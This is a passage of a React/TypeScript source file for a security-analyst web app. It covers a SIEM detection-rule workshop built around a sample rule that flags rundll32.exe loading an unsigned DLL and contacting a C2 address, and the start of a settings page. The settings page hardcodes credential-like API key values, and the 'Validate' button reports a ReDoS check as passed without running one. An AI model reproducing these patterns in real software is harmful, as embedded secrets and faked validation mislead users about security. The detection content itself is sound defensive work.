          { label: 'Supported SIEM Dialects', value: '8 Native Compilers' },
          { label: 'Core Design Philosophy', value: 'Refusals Over Approx.' },
          { label: 'Evaluation Semantics', value: '3-Valued Logic Engine' },
          { label: 'Version Lineage', value: 'Parent → Child DAG' }
        ]}
        doesList={[
          'Compiles canonical intermediate detection representations (RuleIR) into 8 SIEM dialects: Sentinel, Sigma, Splunk, QRadar, Elastic, Wazuh, Chronicle, and CrowdStrike.',
          'Enforces Refusals-Over-Approximations: explicitly flags unsupported pipeline stages instead of emitting silently broken SIEM queries.',
          'Runs a Three-Valued Sample Evaluation Engine (`matched`, `no_match`, `not_evaluated`) with per-stage row transition ledgers.',
          'Synthesizes candidate rules from raw JSONL logs by pinning stable threat predicates and skipping volatile PIDs/timestamps.'
        ]}
        doesNotList={[
          'Never silently drops predicates when translating between incompatible SIEM query languages.',
          'Never uses fragile regexes without first running static ReDoS catastrophic backtracking verification.'
        ]}
        terminalTitle="ruleforge compile --input sig-001.yaml --target sentinel,splunk,wazuh --strict"
        terminalOutput={`[OK] Compiled target: sentinel (Microsoft Sentinel KQL) — 0 warnings\n[OK] Compiled target: splunk (Splunk Enterprise SPL) — 0 warnings\n[REFUSAL] Target: wazuh — Stage 'Derive: C2RiskScore' refused (non-transferable arithmetic expression)\n[EVAL] Sample test: 1 matched, 1 no_match, 1 not_evaluated (missing RemoteIP field)`}
        ctaLabel="Enter RuleForge Workshop →"
        onStart={() => {
          // Bug #2 Fix: strictly 'workshop', NEVER 'studio'
          setMainTab('workshop');
          setSubTab('author');
        }}
      />
    );
  }

  return (
    <div className="space-y-5 max-w-7xl mx-auto pb-12">
      {/* Header Contextual Bar */}
      <div className="rounded-xl p-3.5 sc-surface flex flex-wrap items-center justify-between gap-3">
        <div className="flex flex-wrap items-center gap-2.5">
          <span className="text-xs font-semibold" style={{ color: 'var(--color-text-secondary)' }}>
            Target SIEM Dialect:
          </span>
          <select
            value={activeDialect}
            onChange={(e) => setActiveDialect(e.target.value)}
            className="px-3 py-1.5 rounded-lg text-xs font-bold border"
            style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            aria-label="Select SIEM Dialect"
          >
            {MORE_FIXTURES.ruleforgeDialects.map((d) => (
              <option key={d.id} value={d.id}>
                {d.name}
              </option>
            ))}
          </select>
        </div>

        <div className="flex flex-wrap items-center gap-2">
          <button
            type="button"
            onClick={() => {
              const newVer = {
                id: `v-${105 + historyItems.length}`,
                parentId: historyItems[0].id,
                title: ruleTitle,
                origin: 'authored' as const,
                dialect: activeDialect,
                author,
                timestamp: 'Just now',
                severity,
                diffSummary: `Saved ${activeDialect.toUpperCase()} revision with ${stages.length} pipeline stages and ${conditions.length} predicates`
              };
              setHistoryItems([newVer, ...historyItems]);
              setSelectedVersionId(newVer.id);
              onAddToast({ type: 'success', title: `Saved Rule Version ${newVer.id}`, description: `${ruleTitle} persisted to lineage history.` });
            }}
            disabled={userRole === 'Viewer'}
            className="px-3.5 py-1.5 rounded-lg text-xs font-semibold text-white sc-accent-bg cursor-pointer disabled:opacity-40"
          >
            💾 Save Version
          </button>
          <button
            type="button"
            onClick={() =>
              onPivot({
                fromTool: 'ruleforge',
                fromLabel: `RuleForge Rule: ${ruleId}`,
                fromMainTab: 'workshop',
                fromSubTab: 'author',
                toTool: 'events',
                toMainTab: 'investigation',
                toSubTab: 'events',
                indicatorValue: '198.51.100.45',
                indicatorType: 'RuleForge Hunt Query'
              })
            }
            className="px-3 py-1.5 rounded-lg text-xs font-medium border cursor-pointer"
            style={{ borderColor: 'var(--color-border)' }}
          >
            ⚡ Test Against Event Analyzer Data →
          </button>
        </div>
      </div>

      {/* 12.3 Sub-Tab: Author (3-Column Layout) */}
      {subTab === 'author' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-4 items-start">
          {/* Column 1: Rule Metadata & Source (lg:col-span-3) */}
          <div className="lg:col-span-3 rounded-xl p-4 sc-surface space-y-3 text-xs">
            <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              1. Rule Metadata & Source
            </h3>
            <div>
              <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Rule ID</label>
              <input type="text" value={ruleId} onChange={(e) => setRuleId(e.target.value)} className="w-full px-2.5 py-1.5 rounded border sc-mono" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
            </div>
            <div>
              <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Title</label>
              <input type="text" value={ruleTitle} onChange={(e) => setRuleTitle(e.target.value)} className="w-full px-2.5 py-1.5 rounded border font-semibold" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
            </div>
            <div>
              <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Description</label>
              <textarea rows={3} value={ruleDesc} onChange={(e) => setRuleDesc(e.target.value)} className="w-full p-2 rounded border" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
            </div>
            <div className="grid grid-cols-2 gap-2">
              <div>
                <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Severity</label>
                <select value={severity} onChange={(e) => setSeverity(e.target.value as any)} className="w-full px-2 py-1.5 rounded border" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}>
                  <option value="informational">Informational</option>
                  <option value="low">Low</option>
                  <option value="medium">Medium</option>
                  <option value="high">High</option>
                  <option value="critical">Critical</option>
                </select>
              </div>
              <div>
                <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Author</label>
                <input type="text" value={author} onChange={(e) => setAuthor(e.target.value)} className="w-full px-2 py-1.5 rounded border sc-mono" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
              </div>
            </div>
            <div>
              <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>MITRE ATT&CK Techniques</label>
              <input type="text" value={mitreTags} onChange={(e) => setMitreTags(e.target.value)} className="w-full px-2.5 py-1.5 rounded border sc-mono" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
            </div>
            <div>
              <label className="block text-[11px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Known False Positives</label>
              <textarea rows={2} value={falsePositives} onChange={(e) => setFalsePositives(e.target.value)} className="w-full p-2 rounded border" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
            </div>
            <div className="grid grid-cols-3 gap-1.5">
              <div>
                <label className="block text-[10px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Source Table</label>
                <input type="text" value={sourceTable} onChange={(e) => setSourceTable(e.target.value)} className="w-full px-2 py-1 rounded border sc-mono text-[11px]" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
              </div>
              <div>
                <label className="block text-[10px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Index</label>
                <input type="text" value={indexSelector} onChange={(e) => setIndexSelector(e.target.value)} className="w-full px-2 py-1 rounded border sc-mono text-[11px]" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
              </div>
              <div>
                <label className="block text-[10px] mb-1" style={{ color: 'var(--color-text-secondary)' }}>Time Field</label>
                <input type="text" value={timeField} onChange={(e) => setTimeField(e.target.value)} className="w-full px-2 py-1 rounded border sc-mono text-[11px]" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }} />
              </div>
            </div>
          </div>

          {/* Column 2: Pipeline & Condition Editor (lg:col-span-5) */}
          <div className="lg:col-span-5 rounded-xl p-4 sc-surface space-y-4 text-xs">
            <div className="flex items-center justify-between">
              <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                2. Pipeline Stages & Condition Tree
              </h3>
              <div className="flex items-center gap-1.5">
                <select
                  value={newStageType}
                  onChange={(e) => setNewStageType(e.target.value)}
                  className="px-2 py-1 rounded border text-xs"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                >
                  {['Filter', 'Aggregate', 'Derive', 'Project', 'Sort', 'Limit', 'Distinct', 'Expand', 'Correlation', 'Sequence'].map((st) => (
                    <option key={st} value={st}>
                      {st}
                    </option>
                  ))}
                </select>
                <button
                  type="button"
                  onClick={() =>
                    setStages([
                      ...stages,
                      { id: `stg-${Date.now()}`, type: newStageType, summary: `${newStageType} stage added by analyst` }
                    ])
                  }
                  className="px-2.5 py-1 rounded font-semibold text-white sc-accent-bg cursor-pointer"
                >
                  + Add Stage
                </button>
              </div>
            </div>

            {/* Pipeline Stage Cards */}
            <div className="space-y-2">
              {stages.map((stg, idx) => (
                <div
                  key={stg.id}
                  className="p-2.5 rounded-lg border flex items-center justify-between gap-2"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div className="flex items-center gap-2 min-w-0">
                    <span className="sc-mono text-[10px] px-2 py-0.5 rounded font-bold bg-teal-500/20 text-teal-300">
                      #{idx + 1} {stg.type}
                    </span>
                    <span className="truncate" style={{ color: 'var(--color-text-secondary)' }}>
                      {stg.summary}
                    </span>
                  </div>
                  <button
                    type="button"
                    onClick={() => setStages(stages.filter((s) => s.id !== stg.id))}
                    className="text-red-400 hover:underline text-[11px] shrink-0 cursor-pointer"
                  >
                    Remove
                  </button>
                </div>
              ))}
            </div>

            {/* Visual Condition Editor */}
            <div className="p-3.5 rounded-xl border space-y-3" style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)' }}>
              <div className="flex items-center justify-between">
                <span className="font-bold">Nested AND / OR Condition Builder</span>
                <button
                  type="button"
                  onClick={() =>
                    setConditions([
                      ...conditions,
                      { id: `c-${Date.now()}`, groupLogic: 'AND', field: 'DestinationPort', operator: '==', value: '443' }
                    ])
                  }
                  className="px-2.5 py-1 rounded text-[11px] font-semibold border cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  + Add Condition Row
                </button>
              </div>

              <div className="space-y-2">
                {conditions.map((cond, idx) => (
                  <div key={cond.id} className="flex flex-wrap sm:flex-nowrap items-center gap-1.5">
                    {idx > 0 && (
                      <select
                        value={cond.groupLogic}
                        onChange={(e) =>
                          setConditions(conditions.map((c) => (c.id === cond.id ? { ...c, groupLogic: e.target.value } : c)))
                        }
                        className="px-1.5 py-1 rounded border sc-mono text-[11px] font-bold"
                        style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--accent-from)' }}
                      >
                        <option value="AND">AND</option>
                        <option value="OR">OR</option>
                      </select>
                    )}
                    <input
                      type="text"
                      value={cond.field}
                      onChange={(e) =>
                        setConditions(conditions.map((c) => (c.id === cond.id ? { ...c, field: e.target.value } : c)))
                      }
                      className="w-36 px-2 py-1 rounded border sc-mono text-[11px]"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    />
                    <select
                      value={cond.operator}
                      onChange={(e) =>
                        setConditions(conditions.map((c) => (c.id === cond.id ? { ...c, operator: e.target.value } : c)))
                      }
                      className="px-2 py-1 rounded border sc-mono text-[11px]"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    >
                      {['==', '!=', '<', '>', 'contains', 'in', 'matches', 'like', 'ilike'].map((op) => (
                        <option key={op} value={op}>
                          {op}
                        </option>
                      ))}
                    </select>
                    <input
                      type="text"
                      value={cond.value}
                      onChange={(e) =>
                        setConditions(conditions.map((c) => (c.id === cond.id ? { ...c, value: e.target.value } : c)))
                      }
                      className="flex-1 px-2 py-1 rounded border sc-mono text-[11px]"
                      style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                    />
                    <button
                      type="button"
                      onClick={() => setConditions(conditions.filter((c) => c.id !== cond.id))}
                      className="px-1.5 py-1 text-red-400 cursor-pointer"
                      title="Delete condition"
                    >
                      ✕
                    </button>
                  </div>
                ))}
              </div>
            </div>
          </div>

          {/* Column 3: Rendered Output, Diagnostics & Three-Valued Sample Runner (lg:col-span-4) */}
          <div className="lg:col-span-4 rounded-xl p-4 sc-surface space-y-4 text-xs">
            <div className="flex items-center justify-between">
              <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
                3. Rendered {activeDialect.toUpperCase()} & Runner
              </h3>
              <div className="flex items-center gap-1.5">
                <button
                  type="button"
                  onClick={() => {
                    setLintStatus('✓ Validated at ' + new Date().toLocaleTimeString() + ' — 0 ReDoS risks');
                    onAddToast({ type: 'success', title: 'Structural Lint & ReDoS Check Passed', description: `Dialect ${activeDialect.toUpperCase()} verified.` });
                  }}
                  className="px-2.5 py-1 rounded border text-[11px] font-semibold cursor-pointer"
                  style={{ borderColor: 'var(--color-border)' }}
                >
                  Validate
                </button>
                <button
                  type="button"
                  onClick={() => {
                    copyTextToClipboard(renderedCode);
                    onAddToast({ type: 'info', title: 'Copied Compiled Rule', description: `${activeDialect.toUpperCase()} query copied to clipboard.` });
                  }}
                  className="px-2.5 py-1 rounded text-[11px] font-semibold text-white sc-accent-bg cursor-pointer"
                >
                  Copy
                </button>
              </div>
            </div>

            <div className="text-[11px] sc-mono text-emerald-400">{lintStatus}</div>

            <pre className="p-3.5 rounded-xl sc-mono text-[11px] overflow-x-auto leading-relaxed max-h-56" style={{ backgroundColor: 'var(--color-canvas)' }}>
              {renderedCode}
            </pre>

            {/* Diagnostics & Refusals Panel */}
            <div className="space-y-1.5">
              <div className="font-bold uppercase tracking-wider text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                Translation Diagnostics & Refusals
              </div>
              {diagnosticsList.map((d, i) => (
                <div
                  key={i}
                  className="p-2.5 rounded-lg border flex items-start gap-2 text-[11px]"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <VerdictBadge verdict={d.verdict} label={d.type} />
                  <span>{d.msg}</span>
                </div>
              ))}
            </div>

            {/* Three-Valued Sample Runner */}
            <div className="p-3.5 rounded-xl border space-y-2.5" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}>
              <div className="flex items-center justify-between">
                <span className="font-bold">Three-Valued Sample Log Runner</span>
                <select
                  value={sampleFormat}
                  onChange={(e) => setSampleFormat(e.target.value as any)}
                  className="px-2 py-0.5 rounded border text-[11px]"
                  style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
                >
                  <option value="JSONL">JSONL</option>
                  <option value="JSON">JSON</option>
                  <option value="Key-Value">Key-Value</option>
                  <option value="Syslog">Syslog</option>
                </select>
              </div>

              <textarea
                rows={4}
                value={sampleLogs}
                onChange={(e) => setSampleLogs(e.target.value)}
                className="w-full p-2 rounded border sc-mono text-[10px]"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              />

              <div className="flex items-center justify-between">
                <VerdictBadge
                  verdict={evalVerdict === 'matched' ? 'clean' : evalVerdict === 'no_match' ? 'suspicious' : 'unknown'}
                  label={`VERDICT: ${evalVerdict.toUpperCase()}`}
                />
                <button
                  type="button"
                  onClick={runSampleEvaluation}
                  className="px-3 py-1 rounded text-xs font-semibold text-white sc-accent-bg cursor-pointer"
                >
                  ▶ Run Sample Evaluation
                </button>
              </div>

              <div className="grid grid-cols-3 gap-2 text-center sc-mono text-[11px] pt-1">
                <div className="p-1.5 rounded" style={{ backgroundColor: 'var(--color-canvas)' }}>
                  <div className="text-emerald-400 font-bold">{evalStats.matched}</div>
                  <div className="text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>Matched</div>
                </div>
                <div className="p-1.5 rounded" style={{ backgroundColor: 'var(--color-canvas)' }}>
                  <div className="text-amber-400 font-bold">{evalStats.dropped}</div>
                  <div className="text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>Dropped</div>
                </div>
                <div className="p-1.5 rounded" style={{ backgroundColor: 'var(--color-canvas)' }}>
                  <div className="text-gray-400 font-bold">{evalStats.undecided}</div>
                  <div className="text-[10px]" style={{ color: 'var(--color-text-secondary)' }}>Undecided</div>
                </div>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* 12.4 Sub-Tab: Tune (Import & Tune — 2-Column Layout) */}
      {subTab === 'tune' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5 text-xs">
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="font-bold uppercase tracking-wider">Import Native Rule & Load into Builder</h3>
              <select
                value={tuneDialect}
                onChange={(e) => setTuneDialect(e.target.value)}
                className="px-2.5 py-1 rounded border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              >
                {MORE_FIXTURES.ruleforgeDialects.filter((d) => d.canParse).map((d) => (
                  <option key={d.id} value={d.id}>
                    Source: {d.short}
                  </option>
                ))}
              </select>
            </div>
            <textarea
              rows={10}
              value={tuneInput}
              onChange={(e) => setTuneInput(e.target.value)}
              className="w-full p-3 rounded-lg border sc-mono"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
            <button
              type="button"
              onClick={() => {
                setSubTab('author');
                onAddToast({ type: 'success', title: 'Rule Parsed into RuleIR Builder', description: 'Loaded imported predicates into Author workshop.' });
              }}
              className="px-4 py-2 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer"
            >
              Analyze & Load into Builder →
            </button>
          </div>

          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Plain-English Structural Outline & Translation Diagnostics
            </h3>
            <div className="p-4 rounded-xl border space-y-2 leading-relaxed" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}>
              <div><strong>1. Source Scope:</strong> Queries Windows network connection telemetry (`DeviceNetworkEvents` / Sysmon EID 3).</div>
              <div><strong>2. Primary Filter:</strong> Matches rows where `Image` ends with `\rundll32.exe` AND `DestinationIp` equals `198.51.100.45`.</div>
              <div><strong>3. False Positive Tuning Advice:</strong> Add exclusion predicate for signed Microsoft binaries or internal proxy IPs (`10.0.0.0/8`).</div>
            </div>
          </div>
        </div>
      )}

      {/* 12.5 Sub-Tab: Debug (From Log — 2-Column Layout) */}
      {subTab === 'debug' && (
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-5 text-xs">
          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="font-bold uppercase tracking-wider">Log-to-Rule Synthesis (Multi-Sample Analysis)</h3>
            <textarea
              rows={8}
              value={debugLogsInput}
              onChange={(e) => setDebugLogsInput(e.target.value)}
              className="w-full p-3 rounded-lg border sc-mono"
              style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
            />
            <div className="flex flex-wrap items-center gap-4">
              <label className="flex items-center gap-1.5 cursor-pointer">
                <input type="checkbox" checked={skipVolatile} onChange={(e) => setSkipVolatile(e.target.checked)} />
                <span>Skip volatile fields (PID, GUID, SourcePort)</span>
              </label>
              <label className="flex items-center gap-1.5 cursor-pointer">
                <input type="checkbox" checked={skipTimestamps} onChange={(e) => setSkipTimestamps(e.target.checked)} />
                <span>Skip raw timestamps (`UtcTime`)</span>
              </label>
            </div>
            <button
              type="button"
              onClick={() => {
                setSubTab('author');
                onAddToast({ type: 'success', title: 'Candidate Rule Synthesized', description: 'Pinned Image, CommandLine, and DestinationIp into RuleIR.' });
              }}
              className="px-4 py-2 rounded-lg font-semibold text-white sc-accent-bg cursor-pointer"
            >
              Analyze & Propose Rule →
            </button>
          </div>

          <div className="rounded-xl p-5 sc-surface space-y-3">
            <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Field Stability Analysis (Pinned vs. Skipped Fields)
            </h3>
            <div className="space-y-2">
              {[
                { field: 'Image = C:\\Windows\\System32\\rundll32.exe', status: 'PINNED', reason: '100% invariant across all malicious samples', verdict: 'clean' as VerdictType },
                { field: 'CommandLine contains sync_helper.dll', status: 'PINNED', reason: 'High-entropy payload path shared across samples', verdict: 'clean' as VerdictType },
                { field: 'DestinationIp = 198.51.100.45', status: 'PINNED', reason: 'Invariant C2 endpoint across samples', verdict: 'clean' as VerdictType },
                { field: 'ProcessId (6104 vs 7812)', status: 'SKIPPED', reason: 'Volatile OS-assigned process identifier (high variance)', verdict: 'suspicious' as VerdictType },
                { field: 'UtcTime', status: 'SKIPPED', reason: 'Ephemeral event timestamp', verdict: 'suspicious' as VerdictType }
              ].map((item, idx) => (
                <div
                  key={idx}
                  className="p-3 rounded-lg border flex items-center justify-between gap-2"
                  style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border-subtle)' }}
                >
                  <div>
                    <div className="sc-mono font-bold">{item.field}</div>
                    <div className="text-[11px]" style={{ color: 'var(--color-text-secondary)' }}>
                      {item.reason}
                    </div>
                  </div>
                  <VerdictBadge verdict={item.verdict} label={item.status} />
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 12.6 Sub-Tab: Understand */}
      {subTab === 'understand' && (
        <div className="rounded-xl p-6 sc-surface space-y-4 text-xs">
          <h3 className="text-sm font-bold uppercase tracking-wider">Human-Readable Detection Walkthrough (Analyst Onboarding)</h3>
          <div className="grid grid-cols-1 md:grid-cols-4 gap-3">
            {[
              { step: 'Step 1: Telemetry Source', desc: 'Monitors Windows network connection and process creation events (`DeviceNetworkEvents` / Sysmon Event ID 3).' },
              { step: 'Step 2: Binary & Command Filter', desc: 'Identifies `rundll32.exe` executing an unsigned library located in `C:\\ProgramData\\Microsoft\\Vault\\sync_helper.dll`.' },
              { step: 'Step 3: Network C2 Correlation', desc: 'Flags any outbound session targeting `198.51.100.45` and assigns a derived `C2RiskScore` of 95.' },
              { step: 'Step 4: Triage Output', desc: 'Groups alerts by `DeviceName`, `AccountName`, and `RemoteIP` so analysts can isolate compromised hosts immediately.' }
            ].map((st, i) => (
              <div key={i} className="p-4 rounded-xl border space-y-1.5" style={{ backgroundColor: 'var(--color-surface-raised)', borderColor: 'var(--color-border)' }}>
                <div className="font-bold" style={{ color: 'var(--accent-from)' }}>{st.step}</div>
                <p className="leading-relaxed" style={{ color: 'var(--color-text-secondary)' }}>{st.desc}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      {/* 12.7 Sub-Tab: History (Lineage Tree) */}
      {subTab === 'history' && (
        <div className="grid grid-cols-1 lg:grid-cols-12 gap-5 text-xs">
          <div className="lg:col-span-5 rounded-xl p-4 sc-surface space-y-3">
            <div className="flex items-center justify-between">
              <h3 className="font-bold uppercase tracking-wider">Rule Version History</h3>
              <select
                value={historyFilterOrigin}
                onChange={(e) => setHistoryFilterOrigin(e.target.value)}
                className="px-2 py-1 rounded border"
                style={{ backgroundColor: 'var(--color-canvas)', borderColor: 'var(--color-border)', color: 'var(--color-text-primary)' }}
              >
                <option value="all">All Origins</option>
                <option value="authored">Authored</option>
                <option value="imported">Imported</option>
                <option value="synthesized">Synthesized</option>
              </select>
            </div>
            <div className="space-y-2">
              {historyItems
                .filter((h) => (historyFilterOrigin === 'all' ? true : h.origin === historyFilterOrigin))
                .map((h) => (
                  <div
                    key={h.id}
                    onClick={() => setSelectedVersionId(h.id)}
                    className="p-3 rounded-lg border cursor-pointer"
                    style={{
                      backgroundColor: selectedVersionId === h.id ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                      borderColor: selectedVersionId === h.id ? 'var(--color-border-focus)' : 'var(--color-border)'
                    }}
                  >
                    <div className="flex items-center justify-between">
                      <span className="sc-mono font-bold">{h.id} — {h.dialect.toUpperCase()}</span>
                      <VerdictBadge verdict={h.severity} label={h.origin} />
                    </div>
                    <div className="font-semibold mt-1">{h.title}</div>
                    <div className="text-[11px] mt-0.5" style={{ color: 'var(--color-text-tertiary)' }}>
                      {h.timestamp} · {h.author}
                    </div>
                  </div>
                ))}
            </div>
          </div>

          <div className="lg:col-span-7 rounded-xl p-5 sc-surface space-y-4">
            <h3 className="font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
              Visual Parent → Child Lineage Tree
            </h3>
            <div className="space-y-3">
              {[...historyItems].reverse().map((ver, idx) => (
                <div key={ver.id} className="flex items-start gap-3" style={{ marginLeft: idx * 20 }}>
                  <div className="w-6 h-6 rounded-full sc-accent-bg text-white flex items-center justify-center sc-mono text-[10px] font-bold shrink-0">
                    {ver.id}
                  </div>
                  <div
                    className="flex-1 p-3 rounded-lg border space-y-1"
                    style={{
                      backgroundColor: selectedVersionId === ver.id ? 'var(--color-surface-raised)' : 'var(--color-canvas)',
                      borderColor: selectedVersionId === ver.id ? 'var(--color-border-focus)' : 'var(--color-border)'
                    }}
                  >
                    <div className="flex items-center justify-between">
                      <span className="font-bold">{ver.title}</span>
                      <button
                        type="button"
                        onClick={() => {
                          setRuleTitle(ver.title);
                          setActiveDialect(ver.dialect);
                          setSubTab('author');
                          onAddToast({ type: 'info', title: `Rolled Back to ${ver.id}`, description: ver.diffSummary });
                        }}
                        className="px-2.5 py-0.5 rounded text-[11px] font-semibold text-white sc-accent-bg cursor-pointer"
                      >
                        Rollback to {ver.id}
                      </button>
                    </div>
                    <p style={{ color: 'var(--color-text-secondary)' }}>{ver.diffSummary}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* 12.8 Sub-Tab: Dialects */}
      {subTab === 'dialects' && (
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 text-xs">
          {MORE_FIXTURES.ruleforgeDialects.map((d) => {
            const isAct = activeDialect === d.id;
            return (
              <div
                key={d.id}
                onClick={() => {
                  setActiveDialect(d.id);
                  setSubTab('author');
                  onAddToast({ type: 'info', title: `Active Dialect: ${d.name}`, description: 'Switched RuleForge compiler target.' });
                }}
                className="p-4 rounded-xl sc-surface cursor-pointer hover:scale-[1.01] transition space-y-2.5"
                style={{ borderColor: isAct ? 'var(--color-border-focus)' : 'var(--color-border)' }}
              >
                <div className="flex items-center justify-between">
                  <span className="font-bold text-sm">{d.short}</span>
                  <VerdictBadge verdict="clean" label={`✅ ${d.status}`} />
                </div>
                <div className="font-medium" style={{ color: 'var(--color-text-secondary)' }}>{d.name}</div>
                <div className="flex items-center gap-2 sc-mono text-[10px]">
                  <span className="px-2 py-0.5 rounded border" style={{ borderColor: 'var(--color-border)' }}>
                    can_parse: {d.canParse ? 'true' : 'false'}
                  </span>
                  <span className="px-2 py-0.5 rounded border" style={{ borderColor: 'var(--color-border)' }}>
                    can_render: {d.canRender ? 'true' : 'false'}
                  </span>
                </div>
                <p className="text-[11px] leading-relaxed" style={{ color: 'var(--color-text-tertiary)' }}>
                  {d.notes}
                </p>
              </div>
            );
          })}
        </div>
      )}
    </div>
  );
};

// ============================================================================
// 14. GLOBAL SETTINGS (#/settings) & AUTH UI SHELL (#/login) (Sections 14 & 15)
// ============================================================================
export const SettingsPage: React.FC<{
  theme: 'dark' | 'light' | 'system';
  setTheme: (t: 'dark' | 'light' | 'system') => void;
  fontScale: number;
  setFontScale: (s: number) => void;
  compactMode: boolean;
  setCompactMode: (c: boolean) => void;
  reduceMotion: boolean;
  setReduceMotion: (r: boolean) => void;
  backendStatus: Record<ToolId, 'online' | 'offline' | 'unknown'>;
  onTestBackend: (t: ToolId) => void;
  onAddToast: (t: Omit<ToastMessage, 'id'>) => void;
}> = ({
  theme,
  setTheme,
  fontScale,
  setFontScale,
  compactMode,
  setCompactMode,
  reduceMotion,
  setReduceMotion,
  backendStatus,
  onTestBackend,
  onAddToast
}) => {
  const [category, setCategory] = useState<'appearance' | 'api-keys' | 'backends' | 'cache' | 'shortcuts' | 'about'>('appearance');
  const [useFixturesMode, setUseFixturesMode] = useState(apiClient.useFixtures);
  const [showKeyMap, setShowKeyMap] = useState<Record<string, boolean>>({});
  const [apiKeys, setApiKeys] = useState<Record<string, { val: string; status: 'Valid' | 'Not Set' }>>({
    VT_MALWARE_KEY: { val: 'vt_live_9948102948102948102a', status: 'Valid' },
    HYBRID_ANALYSIS_KEY: { val: 'ha_live_771829104412', status: 'Valid' },
    TRIAGE_KEY: { val: 'triage_live_5519201', status: 'Valid' },
    SHODAN_IOC_KEY: { val: 'shodan_live_8812940129', status: 'Valid' },
    ABUSEIPDB_KEY: { val: 'abuse_live_441029481', status: 'Valid' },
    URLSCAN_KEY: { val: 'urlscan_live_31094812', status: 'Valid' },
    RECORDED_FUTURE_KEY: { val: '', status: 'Not Set' }
  });

  return (
    <div className="max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-12 gap-6 pb-12">
      {/* Left Sidebar Navigation */}
      <div className="md:col-span-3 rounded-xl p-3.5 sc-surface space-y-1 h-fit">
        <div className="px-3 py-2 text-xs font-bold uppercase tracking-wider" style={{ color: 'var(--color-text-secondary)' }}>
          Platform Settings
        </div>
        {[
          { id: 'appearance', label: '🎨 Appearance & Display' },
          { id: 'api-keys', label: '🔑 API Key Management' },
